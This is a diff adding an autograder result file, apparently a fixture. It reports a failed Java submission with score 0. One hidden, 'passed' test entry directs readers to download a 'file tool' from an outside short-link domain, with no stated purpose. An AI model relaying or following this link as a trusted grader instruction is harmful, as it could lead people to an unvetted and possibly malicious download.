@@ -1,0 +1,15 @@
+{
+  "score": 0,
+  "output": "# ERROR: Upload Failed\n**No .java files were submitted.** Please check the *Code* tab and resubmit.",
+  "output_format": "md",
+  "visibility": "visible",
+  "tests": [
+    {
+      "status": "passed",
+      "name": "File tool download",
+      "output": "(Grader) Visit this link to download the file tool: [https://link.canon.click/autograder/filetool](https://link.canon.click/autograder/filetool)",
+      "output_format": "md",
+      "visibility": "hidden"
+    }
+  ]
+}
